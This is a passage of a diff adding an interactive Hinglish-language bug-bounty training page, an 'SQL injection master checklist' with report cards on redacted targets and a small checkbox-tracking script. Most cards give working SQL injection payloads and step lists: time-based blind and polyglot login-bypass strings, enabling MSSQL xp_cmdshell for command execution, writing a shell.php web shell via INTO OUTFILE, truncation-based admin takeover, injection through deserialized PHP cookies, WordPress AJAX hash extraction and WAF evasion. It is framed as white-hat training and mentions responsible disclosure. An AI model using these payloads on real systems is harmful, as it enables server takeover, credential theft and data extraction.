+                                class="c">admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--</code> se delay check on
+                            password change.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">ðŸ§  MASTER TIP</div>
+                    <div class="mindset-text">"Second-Order = 'Legendary' kyunki developers sirf Input (Registration)
+                        sanitize karte hain, par apne hi DB se nikle Output ko trust kar lete hain. Normal scanners ise
+                        kabhi nahi pakad paate."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #26 Polyglot -->
+        <div class="report-card" data-severity="high" id="report-26">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #26 Â· Total #345</div>
+                    <div class="report-title">Polyglot SQLi â€” Universal Login Bypass</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Cloud Service Provider) Â· $4,500 Â· 8.9 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Multi-DB</span><span
+                            class="technique-tag">MySQL+PgSQL+MSSQL</span><span class="technique-tag">Master Key</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Login page. sleep() fail, pg_sleep() fail. DB type unknown! Polyglot
+                        payload: <code class="c">SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/</code>. MySQL
+                        <code class="c">/*...*/</code> comment â†’ pehla SLEEP execute. PostgreSQL/MSSQL: quotes balanced.
+                        Result: 10s delay bina DB type jaane! One-Size-Fits-All!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Quotes mix karo</strong> â€” <code class="c">'</code> aur <code
+                                class="c">"</code> dono payload mein include karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Multi-line comments use karo</strong> â€” <code
+                                class="c">/* ... */</code> se SQL keywords chhupao.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>OR logic chain karo</strong> â€” <code class="c">OR 1=1</code>,
+                            <code class="c">OR '1'='1'</code>, <code class="c">OR "1"="1"</code> ka mix.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Time delays mix karo</strong> â€” <code class="c">SLEEP(5)</code>
+                            (MySQL) + <code class="c">pg_sleep(5)</code> (PG) dono OR se jodo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #27 SQLi to RCE -->
+        <div class="report-card" data-severity="critical" id="report-27">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #27 Â· Total #346</div>
+                    <div class="report-title">SQLi to RCE â€” MSSQL xp_cmdshell</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (US Gov Contractor) Â· $12,000 Â· 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">xp_cmdshell</span><span
+                            class="technique-tag">sp_configure</span><span class="technique-tag">NT
+                            AUTHORITY\SYSTEM</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">?debug=true&id=1</code>. <code
+                            class="c">' UNION SELECT @@version--</code> â†’ MSSQL 2019. Step 1 Enable: <code
+                            class="c">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--</code>.
+                        Step 2 Execute: <code class="c">'; EXEC xp_cmdshell 'whoami';--</code> â†’ <code
+                            class="c">nt authority\system</code> = FULL SERVER TAKEOVER! $12K bounty!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Privileges check karo</strong> â€” MSSQL: <code
+                                class="c">IS_SRVROLEMEMBER('sysadmin')</code>. MySQL: <code
+                                class="c">SELECT super_priv</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>File write test karo</strong> â€” MySQL: <code
+                                class="c">SELECT 'payload' INTO OUTFILE '/var/www/html/shell.php'</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>xp_cmdshell check karo</strong> â€” MSSQL milte hi sabse pehle ye
+                            procedure check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>PostgreSQL UDF try karo</strong> â€” <code
+                                class="c">CREATE FUNCTION</code> se C-language libraries load â†’ RCE.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>WAF encoding use karo</strong> â€” RCE payloads "Noisy" hain, <code
+                                class="c">/**/</code> aur encoding se bypass.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">ðŸ’€ IMPACT</div>
+                    <div class="impact-text">SQLi â†’ RCE = "Ultimate Goal". Server par malware, file delete, network scan
+                        â€” poora system compromised. IoT/Smart Factory mein ye machines physically control kar sakta hai!
+                    </div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #28 SQL Truncation -->
+        <div class="report-card" data-severity="high" id="report-28">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #28 Â· Total #347</div>
+                    <div class="report-title">SQL Truncation Attack â€” Admin Account Takeover</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (EU E-commerce) Â· $3,500 Â· 8.7 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">64-char Limit</span><span
+                            class="technique-tag">Trailing Spaces</span><span class="technique-tag">No Special
+                            Chars</span></div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Username field 64 char limit. Register: <code
+                            class="c">admin[58 spaces]x</code> (65 chars). Validation: "admin...x" doesn't exist â†’ OK.
+                        DB save: truncates to 64 chars â†’ <code class="c">admin[spaces]</code>. MySQL ignores trailing
+                        spaces â†’ TWO "admin" users! "Forgot Password" confuses system â†’ reset link to hacker's email for
+                        REAL admin!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Field limits dhoondho</strong> â€” Registration/Profile mein
+                            character limit (64, 128, 255) check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Truncation test karo</strong> â€” Lambi string bhejo. Save ke baad
+                            "kat" rahi hai? = Truncation possible.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>STRICT MODE check karo</strong> â€” MySQL <code
+                                class="c">STRICT_ALL_TABLES</code> on hai? = Error aayega, attack fail.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>"Forgot Password" exploit karo</strong> â€” Truncation ka asli maza
+                            Account Takeover mein hai.</span>
+                    </li>
+                </ul>
+                <div class="protip-box">
+                    <div class="protip-label">ðŸ’¡ PRO TIP</div>
+                    <div class="protip-text">Truncation = "Legendary" â€” koi <code class="c">'</code> ya UNION nahi,
+                        isliye WAF kabhi nahi pakadega. Poori tarah DB configuration par depend karta hai. Purane
+                        embedded devices ke DBs mein limits chhoti hoti hain = "Goldmine"!</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #29 Chained Deserialization + SQLi -->
+        <div class="report-card" data-severity="critical" id="report-29">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #29 Â· Total #348</div>
+                    <div class="report-title">Chained SQLi via Deserialization â€” Session Cookie</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global ERP) Â· $9,000 Â· 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">PHP Unserialize</span><span
+                            class="technique-tag">Base64 Cookie</span><span class="technique-tag">Chain Attack</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Cookie: <code class="c">session_data=Tzo...</code> (Base64). Decode:
+                        <code class="c">O:11:"UserSession":2:{s:2:"id";i:101;...}</code>. PHP Object â€” id field direct
+                        SQL query! Modified object: <code
+                            class="c">s:2:"id";s:25:"101' AND SLEEP(10) AND '1'='1"</code>. Re-encode Base64. WAF sees
+                        normal token. Backend unserialize â†’ SQL inject â†’ 10s freeze = Chained attack!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Encoded cookies dhoondho</strong> â€” Base64/Serialized data: <code
+                                class="c">O:</code>, <code class="c">a:</code>, <code class="c">s:</code>
+                            patterns.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Decode â†’ Modify â†’ Re-encode</strong> â€” SQL payload inject karo,
+                            check 500 error.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Magic methods check karo</strong> â€” PHP <code
+                                class="c">__wakeup()</code>, <code class="c">__destruct()</code> DB connect karte
+                            hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Blind payload use karo</strong> â€” Deserialization errors screen
+                            par nahi dikhte, Time-based best.</span>
+                    </li>
+                </ul>
+                <div class="chain-box">
+                    <div class="chain-label">â›“ï¸ ATTACK CHAIN</div>
+                    <div class="chain-formula">Base64 Decode â†’ PHP Object Modify â†’ id Field SQLi Inject â†’ Base64
+                        Re-encode â†’ WAF Bypass â†’ Backend Unserialize â†’ SQL Execute â†’ SLEEP(10) â†’ Data Extract!</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #30 Zero-Day CMS Plugin -->
+        <div class="report-card" data-severity="critical" id="report-30">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #30 Â· Total #349</div>
+                    <div class="report-title">Zero-Day SQLi in WordPress/CMS Plugin â€” Mass Vulnerability</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Plugin â€” 1M+ Sites) Â· $15,000 Â· 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">admin-ajax.php</span><span
+                            class="technique-tag">Plugin Analysis</span><span class="technique-tag">0-Day</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">"Custom Fields" plugin analysis. AJAX endpoint: <code
+                            class="c">/wp-admin/admin-ajax.php?action=get_meta&field_id=123</code>. WAF "Internal Trust"
+                        se ignore karta hai AJAX. Payload: <code
+                            class="c">field_id=123' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--</code> â†’ 10s delay â†’
+                        wp_users table se Admin Hashes extract â†’ 1M+ sites affected = $15K bounty!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Third-party scripts check karo</strong> â€” Site ke code se zyada
+                            plugins/CMS/Widgets vulnerable hote hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>AJAX endpoints reverse karo</strong> â€” <code
+                                class="c">admin-ajax.php</code> ya <code class="c">/api/</code> endpoints = SQLi
+                            "Goldmine".</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>SQLMap automate karo</strong> â€” Manual confirm ke baad <code
+                                class="c">sqlmap</code> custom headers ke saath for data extraction.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Responsible Disclosure karo</strong> â€” Hamesha report karo, kabhi
+                            misuse mat karo. White-hat = Bounty.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Document everything</strong> â€” Steps + Screenshots save rakho.
+                            Professional report = Higher bounty.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">ðŸ† THE GRADUATION TIP</div>
+                    <div class="impact-text">Mission 12 complete! Simple <code class="c">'</code> se shuru kiya, OOB,
+                        RCE, aur Polyglots tak ka safar tay kiya. Yaad rakhna: "Sabse pehle Manual recon, phir Targeted
+                        payload, phir Automation."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- â•â•â• FOOTER â•â•â• -->
+<footer class="mission-footer">
+    <p class="footer-text">â¬¡ MISSION 12 Â· SQL INJECTION MASTER CHECKLIST Â· 30 REPORTS Â· 6 PHASES â¬¡</p>
+</footer>
+
+<script>
+    /* â•â•â• STATE KEY â•â•â• */
+    const STORAGE_KEY = 'sqli_master_v1';
+    let state = {};
+
+    /* â•â•â• TOGGLE â•â•â• */
+    function toggleItem(el) {
+        el.classList.toggle('done');
+        const card = el.closest('.report-card');
+        updateCardProgress(card);
+        updateMasterProgress();
+        saveState();
+    }
+
+    /* â•â•â• CARD PROGRESS â•â•â• */
+    function updateCardProgress(card) {
+        const items = card.querySelectorAll('.checklist-item');
+        const done = card.querySelectorAll('.checklist-item.done');
+        const pct = items.length ? Math.round((done.length / items.length) * 100) : 0;
+        const pctEl = card.querySelector('.card-progress-pct');
+        const barEl = card.querySelector('.card-bar-fill');
+        if (pctEl) pctEl.textContent = pct + '%';
+        if (barEl) barEl.style.width = pct + '%';
+    }
+
+    /* â•â•â• MASTER PROGRESS â•â•â• */
+    function updateMasterProgress() {
+        const allItems = document.querySelectorAll('.checklist-item');
+        const allDone = document.querySelectorAll('.checklist-item.done');
+        const pct = allItems.length ? Math.round((allDone.length / allItems.length) * 100) : 0;
+        document.getElementById('masterPct').textContent = pct + '%';
+        document.getElementById('masterBar').style.width = pct + '%';
+        document.getElementById('completedItems').textContent = allDone.length;
+        /* Count fully completed cards */
+        let doneCards = 0;
+        document.querySelectorAll('.report-card').forEach(card => {
+            const t = card.querySelectorAll('.checklist-item').length;
+            const d = card.querySelectorAll('.checklist-item.done').length;
+            if (t > 0 && t === d) doneCards++;
+        });
+        document.getElementById('completedCards').textContent = doneCards;
+        /* Phase counts */
+        for (let p = 1; p <= 6; p++) {
+            const grid = document.getElementById('grid-phase' + p);
+            if (!grid) continue;
+            const cards = grid.querySelectorAll('.report-card');
+            let pDone = 0;
+            cards.forEach(c => {
+                const ct = c.querySelectorAll('.checklist-item').length;
+                const cd = c.querySelectorAll('.checklist-item.done').length;
+                if (ct > 0 && ct === cd) pDone++;
+            });
+            const el = document.getElementById('p' + p + 'count');
+            if (el) el.textContent = pDone + ' / ' + cards.length + ' reports';
+        }
+    }
+
+    /* â•â•â• FILTER â•â•â• */
+    function filterCards(type, btn) {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        document.querySelectorAll('.report-card').forEach(card => {
+            const sev = card.getAttribute('data-severity');
+            const items = card.querySelectorAll('.checklist-item').length;
+            const done = card.querySelectorAll('.checklist-item.done').length;
+            const isComplete = items > 0 && items === done;
+            let show = true;
+            if (type === 'critical') show = sev === 'critical';
+            else if (type === 'high') show = sev === 'high';
+            else if (type === 'complete') show = isComplete;
+            else if (type === 'incomplete') show = !isComplete;
+            card.style.display = show ? '' : 'none';
+        });
+    }
+
+    /* â•â•â• SAVE â•â•â• */
+    function saveState() {
+        const data = {};
+        document.querySelectorAll('.report-card').forEach(card => {
+            const id = card.id;
+            const items = [];
+            card.querySelectorAll('.checklist-item').forEach((item, i) => {
+                items.push(item.classList.contains('done'));
+            });
+            data[id] = items;
+        });
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch (e) { }
+    }
+
+    /* â•â•â• LOAD â•â•â• */
+    function loadState() {
+        try {
+            const raw = localStorage.getItem(STORAGE_KEY);
+            if (!raw) return;
+            const data = JSON.parse(raw);
+            Object.keys(data).forEach(cardId => {
+                const card = document.getElementById(cardId);
+                if (!card) return;
+                const items = card.querySelectorAll('.checklist-item');
+                data[cardId].forEach((done, i) => {
+                    if (items[i] && done) items[i].classList.add('done');
+                });
+                updateCardProgress(card);
+            });
+            updateMasterProgress();
+        } catch (e) { }
+    }
+
+    /* â•â•â• INIT â•â•â• */
+    loadState();
+</script>
+</body>
+
+</html>
